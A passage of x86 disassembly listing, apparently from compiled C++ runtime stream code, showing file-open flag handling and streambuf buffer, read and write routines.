  4030b0:	8d 4e 08             	lea    0x8(%esi),%ecx
  4030b3:	c7 06 bc 91 40 00    	movl   $0x4091bc,(%esi)
  4030b9:	e8 34 fe ff ff       	call   0x402ef2
  4030be:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  4030c5:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4030c9:	8b 06                	mov    (%esi),%eax
  4030cb:	ff 75 08             	push   0x8(%ebp)
  4030ce:	8b 40 04             	mov    0x4(%eax),%eax
  4030d1:	c7 04 30 b8 91 40 00 	movl   $0x4091b8,(%eax,%esi,1)
  4030d8:	8b 06                	mov    (%esi),%eax
  4030da:	8b 48 04             	mov    0x4(%eax),%ecx
  4030dd:	03 ce                	add    %esi,%ecx
  4030df:	e8 85 fe ff ff       	call   0x402f69
  4030e4:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4030e7:	83 66 04 00          	andl   $0x0,0x4(%esi)
  4030eb:	8b c6                	mov    %esi,%eax
  4030ed:	5e                   	pop    %esi
  4030ee:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4030f5:	c9                   	leave
  4030f6:	c2 08 00             	ret    $0x8
  4030f9:	8b 41 f8             	mov    -0x8(%ecx),%eax
  4030fc:	8b 40 04             	mov    0x4(%eax),%eax
  4030ff:	c7 44 08 f8 b8 91 40 	movl   $0x4091b8,-0x8(%eax,%ecx,1)
  403106:	00 
  403107:	c3                   	ret
  403108:	55                   	push   %ebp
  403109:	8b ec                	mov    %esp,%ebp
  40310b:	53                   	push   %ebx
  40310c:	56                   	push   %esi
  40310d:	8b f1                	mov    %ecx,%esi
  40310f:	57                   	push   %edi
  403110:	83 7e 30 ff          	cmpl   $0xffffffff,0x30(%esi)
  403114:	0f 85 2a 01 00 00    	jne    0x403244
  40311a:	8b 55 0c             	mov    0xc(%ebp),%edx
  40311d:	b8 00 40 00 00       	mov    $0x4000,%eax
  403122:	80 e2 80             	and    $0x80,%dl
  403125:	f6 da                	neg    %dl
  403127:	1b d2                	sbb    %edx,%edx
  403129:	23 d0                	and    %eax,%edx
  40312b:	03 d0                	add    %eax,%edx
  40312d:	f6 45 0c 20          	testb  $0x20,0xc(%ebp)
  403131:	75 03                	jne    0x403136
  403133:	80 ce 01             	or     $0x1,%dh
  403136:	6a 40                	push   $0x40
  403138:	58                   	pop    %eax
  403139:	84 45 0c             	test   %al,0xc(%ebp)
  40313c:	74 03                	je     0x403141
  40313e:	80 ce 04             	or     $0x4,%dh
  403141:	f6 45 0c 08          	testb  $0x8,0xc(%ebp)
  403145:	74 07                	je     0x40314e
  403147:	83 4d 0c 02          	orl    $0x2,0xc(%ebp)
  40314b:	83 ca 08             	or     $0x8,%edx
  40314e:	f6 45 0c 10          	testb  $0x10,0xc(%ebp)
  403152:	bf 00 02 00 00       	mov    $0x200,%edi
  403157:	74 06                	je     0x40315f
  403159:	83 4d 0c 02          	orl    $0x2,0xc(%ebp)
  40315d:	0b d7                	or     %edi,%edx
  40315f:	f6 45 0c 02          	testb  $0x2,0xc(%ebp)
  403163:	74 1c                	je     0x403181
  403165:	f6 45 0c 01          	testb  $0x1,0xc(%ebp)
  403169:	74 05                	je     0x403170
  40316b:	83 ca 02             	or     $0x2,%edx
  40316e:	eb 03                	jmp    0x403173
  403170:	83 ca 01             	or     $0x1,%edx
  403173:	f6 45 0c 4d          	testb  $0x4d,0xc(%ebp)
  403177:	75 12                	jne    0x40318b
  403179:	83 4d 0c 10          	orl    $0x10,0xc(%ebp)
  40317d:	0b d7                	or     %edi,%edx
  40317f:	eb 0a                	jmp    0x40318b
  403181:	f6 45 0c 01          	testb  $0x1,0xc(%ebp)
  403185:	0f 84 b9 00 00 00    	je     0x403244
  40318b:	8b 1d 44 91 40 00    	mov    0x409144,%ebx
  403191:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403194:	0b 1d 4c 91 40 00    	or     0x40914c,%ebx
  40319a:	0b 1d 48 91 40 00    	or     0x409148,%ebx
  4031a0:	23 cb                	and    %ebx,%ecx
  4031a2:	74 2f                	je     0x4031d3
  4031a4:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  4031aa:	74 24                	je     0x4031d0
  4031ac:	81 f9 00 0a 00 00    	cmp    $0xa00,%ecx
  4031b2:	74 18                	je     0x4031cc
  4031b4:	81 f9 00 0c 00 00    	cmp    $0xc00,%ecx
  4031ba:	74 0c                	je     0x4031c8
  4031bc:	81 f9 00 0e 00 00    	cmp    $0xe00,%ecx
  4031c2:	75 0f                	jne    0x4031d3
  4031c4:	6a 40                	push   $0x40
  4031c6:	eb 0a                	jmp    0x4031d2
  4031c8:	6a 30                	push   $0x30
  4031ca:	eb 06                	jmp    0x4031d2
  4031cc:	6a 20                	push   $0x20
  4031ce:	eb 02                	jmp    0x4031d2
  4031d0:	6a 10                	push   $0x10
  4031d2:	58                   	pop    %eax
  4031d3:	68 80 01 00 00       	push   $0x180
  4031d8:	50                   	push   %eax
  4031d9:	52                   	push   %edx
  4031da:	ff 75 08             	push   0x8(%ebp)
  4031dd:	e8 89 18 00 00       	call   0x404a6b
  4031e2:	83 c4 10             	add    $0x10,%esp
  4031e5:	83 f8 ff             	cmp    $0xffffffff,%eax
  4031e8:	89 46 30             	mov    %eax,0x30(%esi)
  4031eb:	74 57                	je     0x403244
  4031ed:	33 db                	xor    %ebx,%ebx
  4031ef:	c7 46 34 01 00 00 00 	movl   $0x1,0x34(%esi)
  4031f6:	39 5e 08             	cmp    %ebx,0x8(%esi)
  4031f9:	75 2a                	jne    0x403225
  4031fb:	39 5e 14             	cmp    %ebx,0x14(%esi)
  4031fe:	75 25                	jne    0x403225
  403200:	57                   	push   %edi
  403201:	e8 45 07 00 00       	call   0x40394b
  403206:	3b c3                	cmp    %ebx,%eax
  403208:	59                   	pop    %ecx
  403209:	75 09                	jne    0x403214
  40320b:	c7 46 08 01 00 00 00 	movl   $0x1,0x8(%esi)
  403212:	eb 11                	jmp    0x403225
  403214:	8d 88 00 02 00 00    	lea    0x200(%eax),%ecx
  40321a:	6a 01                	push   $0x1
  40321c:	51                   	push   %ecx
  40321d:	50                   	push   %eax
  40321e:	8b ce                	mov    %esi,%ecx
  403220:	e8 25 04 00 00       	call   0x40364a
  403225:	f6 45 0c 04          	testb  $0x4,0xc(%ebp)
  403229:	74 22                	je     0x40324d
  40322b:	ff 75 0c             	push   0xc(%ebp)
  40322e:	8b 06                	mov    (%esi),%eax
  403230:	8b ce                	mov    %esi,%ecx
  403232:	6a 02                	push   $0x2
  403234:	53                   	push   %ebx
  403235:	ff 50 0c             	call   *0xc(%eax)
  403238:	83 f8 ff             	cmp    $0xffffffff,%eax
  40323b:	75 10                	jne    0x40324d
  40323d:	8b ce                	mov    %esi,%ecx
  40323f:	e8 92 f8 ff ff       	call   0x402ad6
  403244:	33 c0                	xor    %eax,%eax
  403246:	5f                   	pop    %edi
  403247:	5e                   	pop    %esi
  403248:	5b                   	pop    %ebx
  403249:	5d                   	pop    %ebp
  40324a:	c2 0c 00             	ret    $0xc
  40324d:	8b c6                	mov    %esi,%eax
  40324f:	eb f5                	jmp    0x403246
  403251:	56                   	push   %esi
  403252:	8d 71 f4             	lea    -0xc(%ecx),%esi
  403255:	57                   	push   %edi
  403256:	8d 7e 0c             	lea    0xc(%esi),%edi
  403259:	8b cf                	mov    %edi,%ecx
  40325b:	e8 92 00 00 00       	call   0x4032f2
  403260:	8b cf                	mov    %edi,%ecx
  403262:	e8 d9 fc ff ff       	call   0x402f40
  403267:	f6 44 24 0c 01       	testb  $0x1,0xc(%esp)
  40326c:	74 07                	je     0x403275
  40326e:	56                   	push   %esi
  40326f:	e8 e5 06 00 00       	call   0x403959
  403274:	59                   	pop    %ecx
  403275:	8b c6                	mov    %esi,%eax
  403277:	5f                   	pop    %edi
  403278:	5e                   	pop    %esi
  403279:	c2 04 00             	ret    $0x4
  40327c:	b8 1e 82 40 00       	mov    $0x40821e,%eax
  403281:	e8 b2 0a 00 00       	call   0x403d38
  403286:	51                   	push   %ecx
  403287:	51                   	push   %ecx
  403288:	56                   	push   %esi
  403289:	57                   	push   %edi
  40328a:	33 ff                	xor    %edi,%edi
  40328c:	8b f1                	mov    %ecx,%esi
  40328e:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  403291:	89 75 ec             	mov    %esi,-0x14(%ebp)
  403294:	89 7d f0             	mov    %edi,-0x10(%ebp)
  403297:	74 18                	je     0x4032b1
  403299:	8d 4e 0c             	lea    0xc(%esi),%ecx
  40329c:	c7 06 cc 91 40 00    	movl   $0x4091cc,(%esi)
  4032a2:	e8 4b fc ff ff       	call   0x402ef2
  4032a7:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  4032ae:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4032b1:	8b 06                	mov    (%esi),%eax
  4032b3:	ff 75 08             	push   0x8(%ebp)
  4032b6:	8b 40 04             	mov    0x4(%eax),%eax
  4032b9:	c7 04 30 c8 91 40 00 	movl   $0x4091c8,(%eax,%esi,1)
  4032c0:	8b 06                	mov    (%esi),%eax
  4032c2:	8b 48 04             	mov    0x4(%eax),%ecx
  4032c5:	03 ce                	add    %esi,%ecx
  4032c7:	e8 9d fc ff ff       	call   0x402f69
  4032cc:	8b 06                	mov    (%esi),%eax
  4032ce:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4032d1:	8b 40 04             	mov    0x4(%eax),%eax
  4032d4:	83 4c 30 24 01       	orl    $0x1,0x24(%eax,%esi,1)
  4032d9:	89 7e 08             	mov    %edi,0x8(%esi)
  4032dc:	89 7e 04             	mov    %edi,0x4(%esi)
  4032df:	8d 44 30 24          	lea    0x24(%eax,%esi,1),%eax
  4032e3:	5f                   	pop    %edi
  4032e4:	8b c6                	mov    %esi,%eax
  4032e6:	5e                   	pop    %esi
  4032e7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4032ee:	c9                   	leave
  4032ef:	c2 08 00             	ret    $0x8
  4032f2:	8b 41 f4             	mov    -0xc(%ecx),%eax
  4032f5:	8b 40 04             	mov    0x4(%eax),%eax
  4032f8:	c7 44 08 f4 c8 91 40 	movl   $0x4091c8,-0xc(%eax,%ecx,1)
  4032ff:	00 
  403300:	c3                   	ret
  403301:	56                   	push   %esi
  403302:	57                   	push   %edi
  403303:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  403307:	8b f1                	mov    %ecx,%esi
  403309:	85 ff                	test   %edi,%edi
  40330b:	74 04                	je     0x403311
  40330d:	83 66 08 00          	andl   $0x0,0x8(%esi)
  403311:	8b 06                	mov    (%esi),%eax
  403313:	8b 40 04             	mov    0x4(%eax),%eax
  403316:	03 c6                	add    %esi,%eax
  403318:	8b 48 08             	mov    0x8(%eax),%ecx
  40331b:	85 c9                	test   %ecx,%ecx
  40331d:	74 08                	je     0x403327
  40331f:	83 c9 02             	or     $0x2,%ecx
  403322:	89 48 08             	mov    %ecx,0x8(%eax)
  403325:	eb 50                	jmp    0x403377
  403327:	83 78 20 00          	cmpl   $0x0,0x20(%eax)
  40332b:	74 1e                	je     0x40334b
  40332d:	85 ff                	test   %edi,%edi
  40332f:	74 0c                	je     0x40333d
  403331:	8b 48 04             	mov    0x4(%eax),%ecx
  403334:	e8 cf f8 ff ff       	call   0x402c08
  403339:	3b f8                	cmp    %eax,%edi
  40333b:	7e 0e                	jle    0x40334b
  40333d:	8b 06                	mov    (%esi),%eax
  40333f:	8b 40 04             	mov    0x4(%eax),%eax
  403342:	8b 4c 30 20          	mov    0x20(%eax,%esi,1),%ecx
  403346:	e8 f6 fc ff ff       	call   0x403041
  40334b:	85 ff                	test   %edi,%edi
  40334d:	75 2c                	jne    0x40337b
  40334f:	8b 06                	mov    (%esi),%eax
  403351:	8b 40 04             	mov    0x4(%eax),%eax
  403354:	f6 44 30 24 01       	testb  $0x1,0x24(%eax,%esi,1)
  403359:	74 20                	je     0x40337b
  40335b:	8b ce                	mov    %esi,%ecx
  40335d:	e8 46 00 00 00       	call   0x4033a8
  403362:	8b 06                	mov    (%esi),%eax
  403364:	8b 40 04             	mov    0x4(%eax),%eax
  403367:	8d 4c 30 08          	lea    0x8(%eax,%esi,1),%ecx
  40336b:	8b 44 30 08          	mov    0x8(%eax,%esi,1),%eax
  40336f:	85 c0                	test   %eax,%eax
  403371:	74 08                	je     0x40337b
  403373:	0c 02                	or     $0x2,%al
  403375:	89 01                	mov    %eax,(%ecx)
  403377:	33 c0                	xor    %eax,%eax
  403379:	eb 03                	jmp    0x40337e
  40337b:	6a 01                	push   $0x1
  40337d:	58                   	pop    %eax
  40337e:	5f                   	pop    %edi
  40337f:	5e                   	pop    %esi
  403380:	c2 04 00             	ret    $0x4
  403383:	8b 41 28             	mov    0x28(%ecx),%eax
  403386:	39 41 24             	cmp    %eax,0x24(%ecx)
  403389:	73 0f                	jae    0x40339a
  40338b:	48                   	dec    %eax
  40338c:	89 41 28             	mov    %eax,0x28(%ecx)
  40338f:	8a 4c 24 04          	mov    0x4(%esp),%cl
  403393:	88 08                	mov    %cl,(%eax)
  403395:	0f be c1             	movsbl %cl,%eax
  403398:	eb 0b                	jmp    0x4033a5
  40339a:	0f be 54 24 04       	movsbl 0x4(%esp),%edx
  40339f:	8b 01                	mov    (%ecx),%eax
  4033a1:	52                   	push   %edx
  4033a2:	ff 50 24             	call   *0x24(%eax)
  4033a5:	c2 04 00             	ret    $0x4
  4033a8:	56                   	push   %esi
  4033a9:	8b f1                	mov    %ecx,%esi
  4033ab:	8b 06                	mov    (%esi),%eax
  4033ad:	8b 40 04             	mov    0x4(%eax),%eax
  4033b0:	8b 4c 30 04          	mov    0x4(%eax,%esi,1),%ecx
  4033b4:	e8 7c 00 00 00       	call   0x403435
  4033b9:	83 f8 ff             	cmp    $0xffffffff,%eax
  4033bc:	74 1b                	je     0x4033d9
  4033be:	50                   	push   %eax
  4033bf:	e8 d6 19 00 00       	call   0x404d9a
  4033c4:	85 c0                	test   %eax,%eax
  4033c6:	59                   	pop    %ecx
  4033c7:	74 1e                	je     0x4033e7
  4033c9:	8b 06                	mov    (%esi),%eax
  4033cb:	8b 40 04             	mov    0x4(%eax),%eax
  4033ce:	8b 4c 30 04          	mov    0x4(%eax,%esi,1),%ecx
  4033d2:	e8 12 00 00 00       	call   0x4033e9
  4033d7:	eb e0                	jmp    0x4033b9
  4033d9:	8b 06                	mov    (%esi),%eax
  4033db:	8b 40 04             	mov    0x4(%eax),%eax
  4033de:	83 4c 30 08 01       	orl    $0x1,0x8(%eax,%esi,1)
  4033e3:	8d 44 30 08          	lea    0x8(%eax,%esi,1),%eax
  4033e7:	5e                   	pop    %esi
  4033e8:	c3                   	ret
  4033e9:	56                   	push   %esi
  4033ea:	8b f1                	mov    %ecx,%esi
  4033ec:	83 7e 08 00          	cmpl   $0x0,0x8(%esi)
  4033f0:	74 17                	je     0x403409
  4033f2:	83 7e 0c ff          	cmpl   $0xffffffff,0xc(%esi)
  4033f6:	75 05                	jne    0x4033fd
  4033f8:	8b 06                	mov    (%esi),%eax
  4033fa:	ff 50 20             	call   *0x20(%eax)
  4033fd:	8b 06                	mov    (%esi),%eax
  4033ff:	8b ce                	mov    %esi,%ecx
  403401:	ff 50 20             	call   *0x20(%eax)
  403404:	89 46 0c             	mov    %eax,0xc(%esi)
  403407:	5e                   	pop    %esi
  403408:	c3                   	ret
  403409:	8b 46 2c             	mov    0x2c(%esi),%eax
  40340c:	85 c0                	test   %eax,%eax
  40340e:	74 05                	je     0x403415
  403410:	39 46 28             	cmp    %eax,0x28(%esi)
  403413:	72 07                	jb     0x40341c
  403415:	8b 06                	mov    (%esi),%eax
  403417:	8b ce                	mov    %esi,%ecx
  403419:	ff 50 20             	call   *0x20(%eax)
  40341c:	ff 46 28             	incl   0x28(%esi)
  40341f:	8b 46 28             	mov    0x28(%esi),%eax
  403422:	3b 46 2c             	cmp    0x2c(%esi),%eax
  403425:	73 05                	jae    0x40342c
  403427:	0f b6 00             	movzbl (%eax),%eax
  40342a:	5e                   	pop    %esi
  40342b:	c3                   	ret
  40342c:	8b 06                	mov    (%esi),%eax
  40342e:	8b ce                	mov    %esi,%ecx
  403430:	ff 50 20             	call   *0x20(%eax)
  403433:	5e                   	pop    %esi
  403434:	c3                   	ret
  403435:	56                   	push   %esi
  403436:	8b f1                	mov    %ecx,%esi
  403438:	83 7e 08 00          	cmpl   $0x0,0x8(%esi)
  40343c:	74 13                	je     0x403451
  40343e:	83 7e 0c ff          	cmpl   $0xffffffff,0xc(%esi)
  403442:	75 08                	jne    0x40344c
  403444:	8b 06                	mov    (%esi),%eax
  403446:	ff 50 20             	call   *0x20(%eax)
  403449:	89 46 0c             	mov    %eax,0xc(%esi)
  40344c:	8b 46 0c             	mov    0xc(%esi),%eax
  40344f:	5e                   	pop    %esi
  403450:	c3                   	ret
  403451:	8b 06                	mov    (%esi),%eax
  403453:	8b ce                	mov    %esi,%ecx
  403455:	ff 50 20             	call   *0x20(%eax)
  403458:	5e                   	pop    %esi
  403459:	c3                   	ret
  40345a:	8b c1                	mov    %ecx,%eax
  40345c:	33 c9                	xor    %ecx,%ecx
  40345e:	83 48 0c ff          	orl    $0xffffffff,0xc(%eax)
  403462:	c7 00 d8 91 40 00    	movl   $0x4091d8,(%eax)
  403468:	89 48 04             	mov    %ecx,0x4(%eax)
  40346b:	89 48 08             	mov    %ecx,0x8(%eax)
  40346e:	89 48 10             	mov    %ecx,0x10(%eax)
  403471:	89 48 14             	mov    %ecx,0x14(%eax)
  403474:	89 48 18             	mov    %ecx,0x18(%eax)
  403477:	89 48 1c             	mov    %ecx,0x1c(%eax)
  40347a:	89 48 20             	mov    %ecx,0x20(%eax)
  40347d:	89 48 24             	mov    %ecx,0x24(%eax)
  403480:	89 48 28             	mov    %ecx,0x28(%eax)
  403483:	89 48 2c             	mov    %ecx,0x2c(%eax)
  403486:	c3                   	ret
  403487:	56                   	push   %esi
  403488:	8b f1                	mov    %ecx,%esi
  40348a:	e8 14 00 00 00       	call   0x4034a3
  40348f:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  403494:	74 07                	je     0x40349d
  403496:	56                   	push   %esi
  403497:	e8 bd 04 00 00       	call   0x403959
  40349c:	59                   	pop    %ecx
  40349d:	8b c6                	mov    %esi,%eax
  40349f:	5e                   	pop    %esi
  4034a0:	c2 04 00             	ret    $0x4
  4034a3:	56                   	push   %esi
  4034a4:	8b f1                	mov    %ecx,%esi
  4034a6:	c7 06 d8 91 40 00    	movl   $0x4091d8,(%esi)
  4034ac:	e8 37 01 00 00       	call   0x4035e8
  4034b1:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  4034b5:	74 0e                	je     0x4034c5
  4034b7:	8b 76 10             	mov    0x10(%esi),%esi
  4034ba:	85 f6                	test   %esi,%esi
  4034bc:	74 07                	je     0x4034c5
  4034be:	56                   	push   %esi
  4034bf:	e8 95 04 00 00       	call   0x403959
  4034c4:	59                   	pop    %ecx
  4034c5:	5e                   	pop    %esi
  4034c6:	c3                   	ret
  4034c7:	8b c1                	mov    %ecx,%eax
  4034c9:	83 78 10 00          	cmpl   $0x0,0x10(%eax)
  4034cd:	75 27                	jne    0x4034f6
  4034cf:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4034d3:	85 c9                	test   %ecx,%ecx
  4034d5:	74 16                	je     0x4034ed
  4034d7:	8b 54 24 08          	mov    0x8(%esp),%edx
  4034db:	85 d2                	test   %edx,%edx
  4034dd:	74 0e                	je     0x4034ed
  4034df:	89 48 10             	mov    %ecx,0x10(%eax)
  4034e2:	03 ca                	add    %edx,%ecx
  4034e4:	83 60 08 00          	andl   $0x0,0x8(%eax)
  4034e8:	89 48 14             	mov    %ecx,0x14(%eax)
  4034eb:	eb 0b                	jmp    0x4034f8
  4034ed:	c7 40 08 01 00 00 00 	movl   $0x1,0x8(%eax)
  4034f4:	eb 02                	jmp    0x4034f8
  4034f6:	33 c0                	xor    %eax,%eax
  4034f8:	c2 08 00             	ret    $0x8
  4034fb:	55                   	push   %ebp
  4034fc:	8b ec                	mov    %esp,%ebp
  4034fe:	51                   	push   %ecx
  4034ff:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403503:	53                   	push   %ebx
  403504:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403507:	56                   	push   %esi
  403508:	8b c3                	mov    %ebx,%eax
  40350a:	4b                   	dec    %ebx
  40350b:	85 c0                	test   %eax,%eax
  40350d:	57                   	push   %edi
  40350e:	8b f1                	mov    %ecx,%esi
  403510:	74 35                	je     0x403547
  403512:	8b 7d 08             	mov    0x8(%ebp),%edi
  403515:	83 7e 08 00          	cmpl   $0x0,0x8(%esi)
  403519:	75 11                	jne    0x40352c
  40351b:	8b 46 1c             	mov    0x1c(%esi),%eax
  40351e:	3b 46 20             	cmp    0x20(%esi),%eax
  403521:	73 09                	jae    0x40352c
  403523:	8a 0f                	mov    (%edi),%cl
  403525:	88 08                	mov    %cl,(%eax)
  403527:	ff 46 1c             	incl   0x1c(%esi)
  40352a:	eb 10                	jmp    0x40353c
  40352c:	0f b6 0f             	movzbl (%edi),%ecx
  40352f:	8b 06                	mov    (%esi),%eax
  403531:	51                   	push   %ecx
  403532:	8b ce                	mov    %esi,%ecx
  403534:	ff 50 1c             	call   *0x1c(%eax)
  403537:	83 f8 ff             	cmp    $0xffffffff,%eax
  40353a:	74 0b                	je     0x403547
  40353c:	47                   	inc    %edi
  40353d:	ff 45 fc             	incl   -0x4(%ebp)
  403540:	8b c3                	mov    %ebx,%eax
  403542:	4b                   	dec    %ebx
  403543:	85 c0                	test   %eax,%eax
  403545:	75 ce                	jne    0x403515
  403547:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40354a:	5f                   	pop    %edi
  40354b:	5e                   	pop    %esi
  40354c:	5b                   	pop    %ebx
  40354d:	c9                   	leave
  40354e:	c2 08 00             	ret    $0x8
  403551:	55                   	push   %ebp
  403552:	8b ec                	mov    %esp,%ebp
  403554:	51                   	push   %ecx
  403555:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403559:	53                   	push   %ebx
  40355a:	56                   	push   %esi
  40355b:	8b f1                	mov    %ecx,%esi
  40355d:	57                   	push   %edi
  40355e:	83 7e 08 00          	cmpl   $0x0,0x8(%esi)
  403562:	74 45                	je     0x4035a9
  403564:	83 7e 0c ff          	cmpl   $0xffffffff,0xc(%esi)
  403568:	75 08                	jne    0x403572
  40356a:	8b 06                	mov    (%esi),%eax
  40356c:	ff 50 20             	call   *0x20(%eax)
  40356f:	89 46 0c             	mov    %eax,0xc(%esi)
  403572:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403575:	8b c3                	mov    %ebx,%eax
  403577:	4b                   	dec    %ebx
  403578:	85 c0                	test   %eax,%eax
  40357a:	74 23                	je     0x40359f
  40357c:	8b 7d 08             	mov    0x8(%ebp),%edi
  40357f:	83 7e 0c ff          	cmpl   $0xffffffff,0xc(%esi)
  403583:	74 1a                	je     0x40359f
  403585:	8a 46 0c             	mov    0xc(%esi),%al
  403588:	8b ce                	mov    %esi,%ecx
  40358a:	88 07                	mov    %al,(%edi)
  40358c:	8b 06                	mov    (%esi),%eax
  40358e:	47                   	inc    %edi
  40358f:	ff 45 fc             	incl   -0x4(%ebp)
  403592:	ff 50 20             	call   *0x20(%eax)
  403595:	89 46 0c             	mov    %eax,0xc(%esi)
  403598:	8b c3                	mov    %ebx,%eax
  40359a:	4b                   	dec    %ebx
  40359b:	85 c0                	test   %eax,%eax
  40359d:	75 e0                	jne    0x40357f
  40359f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4035a2:	5f                   	pop    %edi
  4035a3:	5e                   	pop    %esi
  4035a4:	5b                   	pop    %ebx
  4035a5:	c9                   	leave
  4035a6:	c2 08 00             	ret    $0x8
  4035a9:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4035ac:	85 db                	test   %ebx,%ebx
  4035ae:	74 ef                	je     0x40359f
  4035b0:	8b 06                	mov    (%esi),%eax
  4035b2:	8b ce                	mov    %esi,%ecx
  4035b4:	ff 50 20             	call   *0x20(%eax)
  4035b7:	83 f8 ff             	cmp    $0xffffffff,%eax
  4035ba:	74 e3                	je     0x40359f
  4035bc:	8b 46 28             	mov    0x28(%esi),%eax
  4035bf:	8b 7e 2c             	mov    0x2c(%esi),%edi
  4035c2:	2b f8                	sub    %eax,%edi
  4035c4:	3b fb                	cmp    %ebx,%edi
  4035c6:	7c 02                	jl     0x4035ca
  4035c8:	8b fb                	mov    %ebx,%edi
  4035ca:	85 ff                	test   %edi,%edi
  4035cc:	7e de                	jle    0x4035ac
  4035ce:	57                   	push   %edi
  4035cf:	50                   	push   %eax
  4035d0:	ff 75 08             	push   0x8(%ebp)
  4035d3:	e8 f8 17 00 00       	call   0x404dd0
  4035d8:	01 7d 08             	add    %edi,0x8(%ebp)
  4035db:	01 7e 28             	add    %edi,0x28(%esi)
  4035de:	01 7d fc             	add    %edi,-0x4(%ebp)
  4035e1:	83 c4 0c             	add    $0xc,%esp
  4035e4:	2b df                	sub    %edi,%ebx
  4035e6:	eb c4                	jmp    0x4035ac
  4035e8:	8b 41 28             	mov    0x28(%ecx),%eax
  4035eb:	3b 41 2c             	cmp    0x2c(%ecx),%eax
  4035ee:	72 0b                	jb     0x4035fb
  4035f0:	8b 41 1c             	mov    0x1c(%ecx),%eax
  4035f3:	3b 41 18             	cmp    0x18(%ecx),%eax
  4035f6:	77 03                	ja     0x4035fb
  4035f8:	33 c0                	xor    %eax,%eax
  4035fa:	c3                   	ret
  4035fb:	83 c8 ff             	or     $0xffffffff,%eax
  4035fe:	c3                   	ret
  4035ff:	83 79 08 00          	cmpl   $0x0,0x8(%ecx)
  403603:	75 15                	jne    0x40361a
  403605:	83 79 10 00          	cmpl   $0x0,0x10(%ecx)
  403609:	75 0f                	jne    0x40361a
  40360b:	8b 01                	mov    (%ecx),%eax
  40360d:	ff 50 28             	call   *0x28(%eax)
  403610:	40                   	inc    %eax
  403611:	f7 d8                	neg    %eax
  403613:	1b c0                	sbb    %eax,%eax
  403615:	83 e0 02             	and    $0x2,%eax
  403618:	48                   	dec    %eax
  403619:	c3                   	ret
  40361a:	33 c0                	xor    %eax,%eax
  40361c:	c3                   	ret
  40361d:	56                   	push   %esi
  40361e:	8b f1                	mov    %ecx,%esi
  403620:	68 00 02 00 00       	push   $0x200
  403625:	e8 21 03 00 00       	call   0x40394b
  40362a:	85 c0                	test   %eax,%eax
  40362c:	59                   	pop    %ecx
  40362d:	75 05                	jne    0x403634
  40362f:	83 c8 ff             	or     $0xffffffff,%eax
  403632:	5e                   	pop    %esi
  403633:	c3                   	ret
  403634:	8d 88 00 02 00 00    	lea    0x200(%eax),%ecx
  40363a:	6a 01                	push   $0x1
  40363c:	51                   	push   %ecx
  40363d:	50                   	push   %eax
  40363e:	8b ce                	mov    %esi,%ecx
  403640:	e8 05 00 00 00       	call   0x40364a
  403645:	6a 01                	push   $0x1
  403647:	58                   	pop    %eax
  403648:	5e                   	pop    %esi
  403649:	c3                   	ret
  40364a:	56                   	push   %esi
  40364b:	8b f1                	mov    %ecx,%esi
  40364d:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  403651:	74 0e                	je     0x403661
  403653:	8b 46 10             	mov    0x10(%esi),%eax
  403656:	85 c0                	test   %eax,%eax
  403658:	74 07                	je     0x403661
  40365a:	50                   	push   %eax
  40365b:	e8 f9 02 00 00       	call   0x403959
  403660:	59                   	pop    %ecx
  403661:	8b 44 24 08          	mov    0x8(%esp),%eax
  403665:	89 46 10             	mov    %eax,0x10(%esi)
  403668:	8b 44 24 10          	mov    0x10(%esp),%eax
  40366c:	89 46 04             	mov    %eax,0x4(%esi)
  40366f:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403673:	89 46 14             	mov    %eax,0x14(%esi)
  403676:	5e                   	pop    %esi
  403677:	c2 0c 00             	ret    $0xc
  40367a:	83 c8 ff             	or     $0xffffffff,%eax
  40367d:	c2 0c 00             	ret    $0xc
  403680:	ff 74 24 08          	push   0x8(%esp)
  403684:	8b 01                	mov    (%ecx),%eax
  403686:	6a 00                	push   $0x0
  403688:	ff 74 24 0c          	push   0xc(%esp)
  40368c:	ff 50 0c             	call   *0xc(%eax)
  40368f:	c2 08 00             	ret    $0x8
  403692:	56                   	push   %esi
  403693:	8b f1                	mov    %ecx,%esi
  403695:	8b 46 24             	mov    0x24(%esi),%eax
  403698:	3b 46 28             	cmp    0x28(%esi),%eax
  40369b:	73 0b                	jae    0x4036a8
  40369d:	ff 74 24 08          	push   0x8(%esp)
  4036a1:	e8 dd fc ff ff       	call   0x403383
  4036a6:	eb 42                	jmp    0x4036ea
  4036a8:	8b 06                	mov    (%esi),%eax
  4036aa:	6a 01                	push   $0x1
  4036ac:	6a 01                	push   $0x1
  4036ae:	6a ff                	push   $0xffffffff
  4036b0:	8b ce                	mov    %esi,%ecx
  4036b2:	ff 50 0c             	call   *0xc(%eax)
  4036b5:	83 f8 ff             	cmp    $0xffffffff,%eax
  4036b8:	75 04                	jne    0x4036be
  4036ba:	0b c0                	or     %eax,%eax
  4036bc:	eb 2c                	jmp    0x4036ea
  4036be:	83 7e 08 00          	cmpl   $0x0,0x8(%esi)
  4036c2:	53                   	push   %ebx
  4036c3:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  4036c7:	75 1e                	jne    0x4036e7
  4036c9:	8b 46 2c             	mov    0x2c(%esi),%eax
  4036cc:	85 c0                	test   %eax,%eax
  4036ce:	74 17                	je     0x4036e7
  4036d0:	8b 4e 28             	mov    0x28(%esi),%ecx
  4036d3:	2b c1                	sub    %ecx,%eax
  4036d5:	48                   	dec    %eax
